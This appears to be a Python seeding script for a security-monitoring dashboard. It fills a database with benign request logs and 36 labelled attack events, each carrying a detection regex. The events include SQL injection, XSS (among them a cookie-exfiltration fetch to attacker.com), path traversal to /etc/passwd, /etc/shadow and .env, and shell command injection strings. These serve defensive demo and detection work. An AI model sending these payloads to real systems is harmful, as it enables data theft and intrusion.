import datetime
import json
import random
import uuid
from typing import Any

from sqlalchemy.orm import Session

from app.db.models import RequestLog, SecurityEvent


def seed_demo_dataset(db: Session) -> dict[str, Any]:
    """Generates ~125 realistic HTTP requests and 36 security incidents spanning the last 60 minutes."""
    # Clean existing records
    db.query(SecurityEvent).delete()
    db.query(RequestLog).delete()
    db.commit()

    now = datetime.datetime.utcnow()

    time_points = []
    for m in range(55, 0, -2):
        base_time = now - datetime.timedelta(minutes=m, seconds=random.randint(5, 55))
        time_points.append(base_time)
    time_points.append(now - datetime.timedelta(seconds=25))
    time_points.append(now - datetime.timedelta(seconds=5))

    benign_ips = ["127.0.0.1", "192.168.1.50", "192.168.1.102", "10.0.0.15", "10.0.0.22"]
    attacker_ips = ["192.168.1.105", "10.0.0.88", "172.16.4.12", "192.168.1.200", "127.0.0.1"]

    benign_endpoints = [
        ("GET", "/api/v1/vulnerable/books/", "", 200, 18.2, 4210),
        ("GET", "/api/v1/vulnerable/books/1/", "", 200, 12.5, 1150),
        ("GET", "/api/v1/vulnerable/books/2/", "", 200, 14.1, 1205),
        ("GET", "/api/v1/vulnerable/books/search/", "q=Python", 200, 22.4, 2890),
        ("GET", "/api/v1/vulnerable/books/search/", "q=Clean+Code", 200, 19.8, 1840),
        ("GET", "/api/v1/vulnerable/books/search/", "q=Design+Patterns", 200, 25.1, 3100),
        ("GET", "/api/v1/vulnerable/books/search/", "q=FastAPI+Guide", 200, 16.3, 1450),
        ("POST", "/api/v1/vulnerable/reviews/", '{"book_id": 1, "review_text": "Great book for software architecture!", "rating": 5}', 201, 35.8, 240),
        ("POST", "/api/v1/vulnerable/reviews/", '{"book_id": 2, "review_text": "Helpful practical examples.", "rating": 4}', 201, 31.2, 235),
    ]

    total_requests_inserted = 0
    total_events_inserted = 0

    # 1. Insert Benign Requests
    for tp in time_points:
        num_reqs = random.randint(2, 4)
        for _ in range(num_reqs):
            req_time = tp + datetime.timedelta(seconds=random.randint(0, 50))
            method, path, body, status, rt, sz = random.choice(benign_endpoints)
            req_id = uuid.uuid4().hex
            ip = random.choice(benign_ips)
            url = f"http://localhost:8000{path}"
            if method == "GET" and body:
                url = f"{url}?{body}"
                query_params = body
            else:
                query_params = None

            log = RequestLog(
                request_id=req_id,
                timestamp=req_time,
                client_ip=ip,
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
                method=method,
                url=url,
                path=path,
                headers=json.dumps({"Host": "localhost:8000", "Accept": "application/json"}),
                query_params=query_params,
                body_hash=None,
                response_status=status,
                response_time_ms=round(rt + random.uniform(-3.0, 5.0), 1),
                response_size=sz + random.randint(-50, 50),
            )
            db.add(log)
            total_requests_inserted += 1

    # 2. Define 36 Attack Scenarios
    attacks = [
        # SQL Injection (14)
        {
            "type": "SQL_INJECTION", "method": "GET", "path": "/api/v1/vulnerable/books/search/",
            "query": "q=Python%27%20OR%201%3D1--", "body": None, "severity": "CRITICAL", "score": 92.5,
            "rule_id": "SQLI-001", "rule_name": "Boolean-based SQL Injection Tautology",
            "evidence": "' OR 1=1--", "canonical": "' or 1=1--",
            "pattern": r"(?i)(?:'|\%27)\s*(?:or|and)\s*[\w\d]+\s*=\s*[\w\d]+",
            "location": "QUERY_PARAM", "desc": "Tautology bypass attempting to dump all book records."
        },
        {
            "type": "SQL_INJECTION", "method": "GET", "path": "/api/v1/vulnerable/books/search/",
            "query": "q=%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20auth_user--", "body": None, "severity": "CRITICAL", "score": 96.0,
            "rule_id": "SQLI-002", "rule_name": "UNION-based SQL Injection Column Leak",
            "evidence": "' UNION SELECT username,password FROM auth_user--", "canonical": "' union select username,password from auth_user--",
            "pattern": r"(?i)union\s+(?:all\s+)?select\s+",
            "location": "QUERY_PARAM", "desc": "Union query aimed at dumping administrative credentials."
        },
        {
            "type": "SQL_INJECTION", "method": "GET", "path": "/api/v1/vulnerable/books/search/",
            "query": "q=1%27%20OR%20%27a%27%3D%27a", "body": None, "severity": "HIGH", "score": 88.0,
            "rule_id": "SQLI-001", "rule_name": "String Tautology SQL Injection",
            "evidence": "' OR 'a'='a", "canonical": "' or 'a'='a",
            "pattern": r"(?i)(?:'|\%27)\s*or\s*'[^']+'\s*=\s*'[^']+'",
            "location": "QUERY_PARAM", "desc": "Classic authentication bypass syntax in search query."
        },
        {
            "type": "SQL_INJECTION", "method": "GET", "path": "/api/v1/vulnerable/books/search/",
            "query": "q=test%27%3B%20DROP%20TABLE%20books%3B--", "body": None, "severity": "CRITICAL", "score": 98.5,
            "rule_id": "SQLI-003", "rule_name": "Stacked Queries DDL Injection",
            "evidence": "'; DROP TABLE books;--", "canonical": "'; drop table books;--",
            "pattern": r"(?i);\s*(?:drop|alter|truncate)\s+table",
            "location": "QUERY_PARAM", "desc": "Destructive SQL statement concatenation."
        },
        {
            "type": "SQL_INJECTION", "method": "GET", "path": "/api/v1/vulnerable/books/search/",
            "query": "q=%27%20AND%20SLEEP(5)--", "body": None, "severity": "HIGH", "score": 89.0,
            "rule_id": "SQLI-004", "rule_name": "Time-based Blind SQL Injection",
            "evidence": "' AND SLEEP(5)--", "canonical": "' and sleep(5)--",
            "pattern": r"(?i)(?:sleep|benchmark|pg_sleep)\s*\(",
            "location": "QUERY_PARAM", "desc": "Time delay injection for blind data inference."
        },
        {
            "type": "SQL_INJECTION", "method": "GET", "path": "/api/v1/vulnerable/books/search/",
            "query": "q=admin%27%20--", "body": None, "severity": "MEDIUM", "score": 76.5,
            "rule_id": "SQLI-005", "rule_name": "SQL Comment Truncation",
            "evidence": "' --", "canonical": "' --",
            "pattern": r"(?:'|\%27)\s*--",
            "location": "QUERY_PARAM", "desc": "Inline comment operator suppressing subsequent clauses."
        },
        {
            "type": "SQL_INJECTION", "method": "GET", "path": "/api/v1/vulnerable/books/search/",
            "query": "q=%27%20OR%201%3D1%23", "body": None, "severity": "CRITICAL", "score": 91.0,
            "rule_id": "SQLI-001", "rule_name": "Hash Comment SQL Tautology",
            "evidence": "' OR 1=1#", "canonical": "' or 1=1#",
            "pattern": r"(?i)(?:'|\%27)\s*or\s*1=1",
            "location": "QUERY_PARAM", "desc": "MySQL-style hash comment tautology."
        },
        {
            "type": "SQL_INJECTION", "method": "GET", "path": "/api/v1/vulnerable/books/search/",
            "query": "q=%22%20OR%20%22%22%3D%22", "body": None, "severity": "HIGH", "score": 85.0,
            "rule_id": "SQLI-001", "rule_name": "Double Quote String Tautology",
            "evidence": '" OR ""="', "canonical": '" or ""="',
            "pattern": r'(?i)(?:"|\%22)\s*or\s*""=""',
            "location": "QUERY_PARAM", "desc": "Double quoted tautological comparison."
        },
        {
            "type": "SQL_INJECTION", "method": "GET", "path": "/api/v1/vulnerable/books/search/",
            "query": "q=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--", "body": None, "severity": "HIGH", "score": 87.5,
            "rule_id": "SQLI-002", "rule_name": "UNION Column Enumeration Probe",
            "evidence": "UNION ALL SELECT NULL,NULL,NULL--", "canonical": "union all select null,null,null--",
            "pattern": r"(?i)union\s+all\s+select",
            "location": "QUERY_PARAM", "desc": "Enumerating query column counts using NULL vectors."
        },
        {
            "type": "SQL_INJECTION", "method": "GET", "path": "/api/v1/vulnerable/books/search/",
            "query": "q=%27%20HAVING%201%3D1--", "body": None, "severity": "MEDIUM", "score": 79.0,
            "rule_id": "SQLI-006", "rule_name": "HAVING Clause Injection",
            "evidence": "' HAVING 1=1--", "canonical": "' having 1=1--",
            "pattern": r"(?i)having\s+1=1",
            "location": "QUERY_PARAM", "desc": "Error-based column discovery using HAVING clause."
        },
        {
            "type": "SQL_INJECTION", "method": "GET", "path": "/api/v1/vulnerable/books/search/",
            "query": "q=%27%20OR%20EXISTS(SELECT%20*%20FROM%20users)--", "body": None, "severity": "HIGH", "score": 86.0,
            "rule_id": "SQLI-007", "rule_name": "EXISTS Subquery Leak",
            "evidence": "' OR EXISTS(SELECT * FROM users)--", "canonical": "' or exists(select * from users)--",
            "pattern": r"(?i)or\s+exists\s*\(",
            "location": "QUERY_PARAM", "desc": "Table existence brute-forcing."
        },
        {
            "type": "SQL_INJECTION", "method": "GET", "path": "/api/v1/vulnerable/books/search/",
            "query": "q=Python%27%20AND%201%3D2%20UNION%20SELECT%201%2Ctitle%2C3%2C4%20FROM%20books--", "body": None, "severity": "CRITICAL", "score": 93.0,
            "rule_id": "SQLI-002", "rule_name": "UNION Data Extraction",
            "evidence": "' AND 1=2 UNION SELECT 1,title,3,4 FROM books--", "canonical": "' and 1=2 union select 1,title,3,4 from books--",
            "pattern": r"(?i)union\s+select",
            "location": "QUERY_PARAM", "desc": "Data extraction through secondary table join."
        },
        {
            "type": "SQL_INJECTION", "method": "GET", "path": "/api/v1/vulnerable/books/search/",
            "query": "q=%27%20OR%20version()%3E%270%27--", "body": None, "severity": "HIGH", "score": 84.5,
            "rule_id": "SQLI-008", "rule_name": "Database Banner Fingerprinting",
            "evidence": "' OR version()>'0'--", "canonical": "' or version()>'0'--",
            "pattern": r"(?i)version\s*\(\)",
            "location": "QUERY_PARAM", "desc": "Database version disclosure attempt."
        },
        {
            "type": "SQL_INJECTION", "method": "GET", "path": "/api/v1/vulnerable/books/search/",
            "query": "q=%27%20OR%201%3D1%20LIMIT%201%20OFFSET%200--", "body": None, "severity": "CRITICAL", "score": 90.0,
            "rule_id": "SQLI-001", "rule_name": "Paginated SQL Injection Bypass",
            "evidence": "' OR 1=1 LIMIT 1 OFFSET 0--", "canonical": "' or 1=1 limit 1 offset 0--",
            "pattern": r"(?i)(?:'|\%27)\s*or\s*1=1",
            "location": "QUERY_PARAM", "desc": "Tautology combined with LIMIT truncation."
        },

        # XSS (10)
        {
            "type": "XSS", "method": "POST", "path": "/api/v1/vulnerable/reviews/",
            "query": None, "body": '{"book_id": 1, "review_text": "<script>alert(\'PBL6-SOC-Test\')</script>", "rating": 5}',
            "severity": "CRITICAL", "score": 94.0, "rule_id": "XSS-001", "rule_name": "Stored Script Tag Execution",
            "evidence": "<script>alert('PBL6-SOC-Test')</script>", "canonical": "<script>alert('pbl6-soc-test')</script>",
            "pattern": r"(?i)<\s*script[^>]*>.*?<\s*/\s*script\s*>", "location": "BODY", "desc": "Stored XSS payload injected into book review body."
        },
        {
            "type": "XSS", "method": "POST", "path": "/api/v1/vulnerable/reviews/",
            "query": None, "body": '{"book_id": 2, "review_text": "<img src=x onerror=alert(document.cookie)>", "rating": 1}',
            "severity": "HIGH", "score": 91.0, "rule_id": "XSS-002", "rule_name": "Image Tag Event Handler Injection",
            "evidence": "<img src=x onerror=alert(document.cookie)>", "canonical": "<img src=x onerror=alert(document.cookie)>",
            "pattern": r"(?i)<\s*img[^>]+onerror\s*=", "location": "BODY", "desc": "Stealing session cookies via broken image fallback handler."
        },
        {
            "type": "XSS", "method": "POST", "path": "/api/v1/vulnerable/reviews/",
            "query": None, "body": '{"book_id": 3, "review_text": "<svg onload=fetch(\'http://attacker.com/steal?c=\'+document.cookie)>", "rating": 3}',
            "severity": "CRITICAL", "score": 97.0, "rule_id": "XSS-003", "rule_name": "SVG Vector Exfiltration",
            "evidence": "<svg onload=fetch(...)>", "canonical": "<svg onload=fetch(...)>",
            "pattern": r"(?i)<\s*svg[^>]+onload\s*=", "location": "BODY", "desc": "Inline SVG element executing exfiltration fetch call."
        },
        {
            "type": "XSS", "method": "GET", "path": "/api/v1/vulnerable/books/search/",
            "query": "q=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fevil.com%27%3C%2Fscript%3E",
            "body": None, "severity": "HIGH", "score": 88.0, "rule_id": "XSS-001", "rule_name": "Reflected Script Redirection",
            "evidence": "<script>document.location='http://evil.com'</script>", "canonical": "<script>document.location='http://evil.com'</script>",
            "pattern": r"(?i)<\s*script", "location": "QUERY_PARAM", "desc": "Reflected XSS attempting to force-redirect victim browser."
        },
        {
            "type": "XSS", "method": "POST", "path": "/api/v1/vulnerable/reviews/",
            "query": None, "body": '{"book_id": 1, "review_text": "<body onload=alert(\'XSS\')>", "rating": 4}',
            "severity": "HIGH", "score": 86.0, "rule_id": "XSS-004", "rule_name": "Body Element Onload Handler",
            "evidence": "<body onload=alert('XSS')>", "canonical": "<body onload=alert('xss')>",
            "pattern": r"(?i)<\s*body[^>]+onload\s*=", "location": "BODY", "desc": "Body injection executing onload."
        },
        {
            "type": "XSS", "method": "POST", "path": "/api/v1/vulnerable/reviews/",
            "query": None, "body": '{"book_id": 4, "review_text": "<iframe src=\\"javascript:alert(1)\\"></iframe>", "rating": 2}',
            "severity": "HIGH", "score": 89.5, "rule_id": "XSS-005", "rule_name": "Iframe JavaScript Pseudo-Protocol",
            "evidence": '<iframe src="javascript:alert(1)"></iframe>', "canonical": '<iframe src="javascript:alert(1)"></iframe>',
            "pattern": r'(?i)<\s*iframe[^>]+src=["\']?javascript:', "location": "BODY", "desc": "Malicious iframe running script in origin context."
        },
        {
            "type": "XSS", "method": "GET", "path": "/api/v1/vulnerable/books/search/",
            "query": "q=%22%3E%3Cscript%3Econfirm(1)%3C%2Fscript%3E",
            "body": None, "severity": "MEDIUM", "score": 82.0, "rule_id": "XSS-001", "rule_name": "Attribute Breakout Script Injection",
            "evidence": '"><script>confirm(1)</script>', "canonical": '"><script>confirm(1)</script>',
            "pattern": r'(?i)">\s*<\s*script', "location": "QUERY_PARAM", "desc": "Breaking out of input attribute value with closing quotes."
        },
        {
            "type": "XSS", "method": "POST", "path": "/api/v1/vulnerable/reviews/",
            "query": None, "body": '{"book_id": 5, "review_text": "<a href=\\"javascript:alert(document.domain)\\">Click here to win</a>", "rating": 5}',
            "severity": "MEDIUM", "score": 79.5, "rule_id": "XSS-006", "rule_name": "Anchor Javascript Scheme",
            "evidence": '<a href="javascript:alert(document.domain)">', "canonical": '<a href="javascript:alert(document.domain)">',
            "pattern": r'(?i)<\s*a[^>]+href=["\']?javascript:', "location": "BODY", "desc": "Phishing anchor with embedded JS protocol."
        },
        {
            "type": "XSS", "method": "POST", "path": "/api/v1/vulnerable/reviews/",
            "query": None, "body": '{"book_id": 2, "review_text": "<input onfocus=alert(1) autofocus>", "rating": 3}',
            "severity": "HIGH", "score": 85.0, "rule_id": "XSS-007", "rule_name": "Autofocus Triggered Execution",
            "evidence": "<input onfocus=alert(1) autofocus>", "canonical": "<input onfocus=alert(1) autofocus>",
            "pattern": r"(?i)<\s*input[^>]+autofocus", "location": "BODY", "desc": "Instant zero-click execution using HTML5 autofocus."
        },
        {
            "type": "XSS", "method": "GET", "path": "/api/v1/vulnerable/books/search/",
            "query": "q=%3Cdetails%20open%20ontoggle%3Dalert(1)%3E",
            "body": None, "severity": "HIGH", "score": 84.0, "rule_id": "XSS-008", "rule_name": "HTML5 Details Ontoggle Payload",
            "evidence": "<details open ontoggle=alert(1)>", "canonical": "<details open ontoggle=alert(1)>",
            "pattern": r"(?i)<\s*details[^>]+ontoggle\s*=", "location": "QUERY_PARAM", "desc": "Modern HTML5 semantic tag bypass."
        },

        # Path Traversal (7)
        {
            "type": "PATH_TRAVERSAL", "method": "GET", "path": "/api/v1/vulnerable/files/download/",
            "query": "file=..%2f..%2f..%2f..%2fetc%2fpasswd", "body": None, "severity": "CRITICAL", "score": 95.0,
            "rule_id": "PATH-001", "rule_name": "Linux Root File Traversal",
            "evidence": "../../../../etc/passwd", "canonical": "../../../../etc/passwd",
            "pattern": r"(?:\.\./|\.\.\\){2,}", "location": "QUERY_PARAM", "desc": "Directory breakout aiming to read /etc/passwd user accounts."
        },
        {
            "type": "PATH_TRAVERSAL", "method": "GET", "path": "/api/v1/vulnerable/files/download/",
            "query": "file=..%2f..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts", "body": None, "severity": "HIGH", "score": 90.0,
            "rule_id": "PATH-002", "rule_name": "Windows System Hosts Traversal",
            "evidence": "../../../../windows/system32/drivers/etc/hosts", "canonical": "../../../../windows/system32/drivers/etc/hosts",
            "pattern": r"(?i)windows[\\/]system32", "location": "QUERY_PARAM", "desc": "Targeting Windows hosts file via relative path jumps."
        },
        {
            "type": "PATH_TRAVERSAL", "method": "GET", "path": "/api/v1/vulnerable/files/download/",
            "query": "file=..%2f..%2f.env", "body": None, "severity": "CRITICAL", "score": 96.0,
            "rule_id": "PATH-003", "rule_name": "Environment Secrets Leak",
            "evidence": "../../.env", "canonical": "../../.env",
            "pattern": r"(?:\.\.[\\/])+\.env", "location": "QUERY_PARAM", "desc": "Attempting to steal Django secret key and database credentials."
        },
        {
            "type": "PATH_TRAVERSAL", "method": "GET", "path": "/api/v1/vulnerable/files/download/",
            "query": "file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow", "body": None, "severity": "CRITICAL", "score": 98.0,
            "rule_id": "PATH-001", "rule_name": "Linux Password Shadow Extraction",
            "evidence": "../../../etc/shadow", "canonical": "../../../etc/shadow",
            "pattern": r"etc/shadow", "location": "QUERY_PARAM", "desc": "Reading hashed root passwords."
        },
        {
            "type": "PATH_TRAVERSAL", "method": "GET", "path": "/api/v1/vulnerable/files/download/",
            "query": "file=..%5c..%5c..%5cboot.ini", "body": None, "severity": "MEDIUM", "score": 78.0,
            "rule_id": "PATH-002", "rule_name": "Windows Backslash Boot INI",
            "evidence": "..\\..\\..\\boot.ini", "canonical": "..\\..\\..\\boot.ini",
            "pattern": r"\.\.\\\.\.\\", "location": "QUERY_PARAM", "desc": "Windows backslash path traversal."
        },
        {
            "type": "PATH_TRAVERSAL", "method": "GET", "path": "/api/v1/vulnerable/files/download/",
            "query": "file=....//....//....//etc/passwd", "body": None, "severity": "HIGH", "score": 87.0,
            "rule_id": "PATH-004", "rule_name": "Filter Bypass Nested Dots",
            "evidence": "....//....//....//etc/passwd", "canonical": "../../../../etc/passwd",
            "pattern": r"\.{2,}/", "location": "QUERY_PARAM", "desc": "Nested traversal characters to bypass naive string replace."
        },
        {
            "type": "PATH_TRAVERSAL", "method": "GET", "path": "/api/v1/vulnerable/files/download/",
            "query": "file=%252e%252e%252f%252e%252e%252fetc%2fpasswd", "body": None, "severity": "HIGH", "score": 91.5,
            "rule_id": "PATH-005", "rule_name": "Double URL-Encoded Traversal",
            "evidence": "%2e%2e%2f%2e%2e%2fetc/passwd", "canonical": "../../etc/passwd",
            "pattern": r"%252e%252e", "location": "QUERY_PARAM", "desc": "Double hex encoding bypass against WAF decoders."
        },

        # Command Injection (5)
        {
            "type": "COMMAND_INJECTION", "method": "POST", "path": "/api/v1/vulnerable/admin/ping/",
            "query": None, "body": '{"target": "127.0.0.1; whoami"}', "severity": "CRITICAL", "score": 96.5,
            "rule_id": "CMD-001", "rule_name": "Semicolon Shell Command Chaining",
            "evidence": "; whoami", "canonical": "; whoami",
            "pattern": r";\s*(?:whoami|cat|ls|id|uname)", "location": "BODY", "desc": "Executing whoami to discover web server worker user privilege."
        },
        {
            "type": "COMMAND_INJECTION", "method": "POST", "path": "/api/v1/vulnerable/admin/ping/",
            "query": None, "body": '{"target": "127.0.0.1 | cat /etc/passwd"}', "severity": "CRITICAL", "score": 98.0,
            "rule_id": "CMD-002", "rule_name": "Pipe Command Redirection",
            "evidence": "| cat /etc/passwd", "canonical": "| cat /etc/passwd",
            "pattern": r"\|\s*cat\s+", "location": "BODY", "desc": "Piping ping output into cat to read sensitive system files."
        },
        {
            "type": "COMMAND_INJECTION", "method": "POST", "path": "/api/v1/vulnerable/admin/ping/",
            "query": None, "body": '{"target": "127.0.0.1 && id"}', "severity": "HIGH", "score": 92.0,
            "rule_id": "CMD-003", "rule_name": "Boolean AND Command Sequence",
            "evidence": "&& id", "canonical": "&& id",
            "pattern": r"&&\s*id", "location": "BODY", "desc": "Appending id command to verify root/sudo access."
        },
        {
            "type": "COMMAND_INJECTION", "method": "POST", "path": "/api/v1/vulnerable/admin/ping/",
            "query": None, "body": '{"target": "127.0.0.1 `uname -a`"}', "severity": "HIGH", "score": 89.0,
            "rule_id": "CMD-004", "rule_name": "Backtick Shell Sub-execution",
            "evidence": "`uname -a`", "canonical": "`uname -a`",
            "pattern": r"`[^`]+`", "location": "BODY", "desc": "Backtick command interpolation for OS architecture fingerprinting."
        },
        {
            "type": "COMMAND_INJECTION", "method": "POST", "path": "/api/v1/vulnerable/admin/ping/",
            "query": None, "body": '{"target": "127.0.0.1 $(sleep 5)"}', "severity": "HIGH", "score": 91.0,
            "rule_id": "CMD-005", "rule_name": "Shell Expansion Subshell Injection",
            "evidence": "$(sleep 5)", "canonical": "$(sleep 5)",
            "pattern": r"\$\([^)]+\)", "location": "BODY", "desc": "Command substitution used for time-based blind verification."
        },
    ]

    step = len(time_points) / len(attacks)
    for idx, atk in enumerate(attacks):
        tp_idx = min(int(idx * step), len(time_points) - 1)
        event_time = time_points[tp_idx] + datetime.timedelta(seconds=random.randint(10, 50))

        req_id = uuid.uuid4().hex
        evt_id = uuid.uuid4().hex
        attacker_ip = random.choice(attacker_ips)

        url = f"http://localhost:8000{atk['path']}"
        if atk["query"]:
            url = f"{url}?{atk['query']}"

        req_log = RequestLog(
            request_id=req_id,
            timestamp=event_time,
            client_ip=attacker_ip,
            user_agent="Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
            method=atk["method"],
            url=url,
            path=atk["path"],
            headers=json.dumps({"Host": "localhost:8000", "User-Agent": "PBL6-Security-Scanner/2.0"}),
            query_params=atk["query"],
            body_hash=None,
            response_status=200,
            response_time_ms=round(random.uniform(20.0, 65.0), 1),
            response_size=random.randint(300, 1800),
        )
        db.add(req_log)
        total_requests_inserted += 1

        details_obj = {
            "total_matches": 1,
            "attack_families": [atk["type"]],
            "highest_severity": atk["severity"],
            "rule_risk_score": atk["score"],
            "execution_time_ms": round(random.uniform(0.3, 1.2), 3),
            "matches": [
                {
                    "rule_id": atk["rule_id"],
                    "attack_type": atk["type"],
                    "severity": atk["severity"],
                    "confidence": 0.95,
                    "name": atk["rule_name"],
                    "description": atk["desc"],
                    "location": atk["location"],
                    "location_key": "query" if atk["query"] else "body",
                    "evidence": atk["evidence"],
                    "raw_input": atk["evidence"],
                    "canonical_input": atk["canonical"],
                    "pattern": atk["pattern"],
                }
            ],
            "rule_matches": [
                {
                    "rule_id": atk["rule_id"],
                    "attack_type": atk["type"],
                    "severity": atk["severity"],
                    "confidence": 0.95,
                    "name": atk["rule_name"],
                    "description": atk["desc"],
                    "location": atk["location"],
                    "location_key": "query" if atk["query"] else "body",
                    "evidence": atk["evidence"],
                    "raw_input": atk["evidence"],
                    "canonical_input": atk["canonical"],
                    "pattern": atk["pattern"],
                }
            ],
        }

        sec_event = SecurityEvent(
            event_id=evt_id,
            request_id=req_id,
            timestamp=event_time,
            client_ip=attacker_ip,
            attack_type=atk["type"],
            severity=atk["severity"],
            action="MONITOR",
            risk_score=atk["score"],
            rule_score=atk["score"],
            ml_score=None,
            anomaly_score=None,
            behavior_score=None,
            details=json.dumps(details_obj),
        )
        db.add(sec_event)
        total_events_inserted += 1

    db.commit()

    return {
        "status": "success",
        "message": f"Đã nạp thành công bộ dữ liệu mẫu gồm {total_requests_inserted} requests và {total_events_inserted} sự kiện bảo mật!",
        "total_requests": total_requests_inserted,
        "total_events": total_events_inserted,
        "family_breakdown": {
            "SQL_INJECTION": sum(1 for a in attacks if a["type"] == "SQL_INJECTION"),
            "XSS": sum(1 for a in attacks if a["type"] == "XSS"),
            "PATH_TRAVERSAL": sum(1 for a in attacks if a["type"] == "PATH_TRAVERSAL"),
            "COMMAND_INJECTION": sum(1 for a in attacks if a["type"] == "COMMAND_INJECTION"),
        },
    }
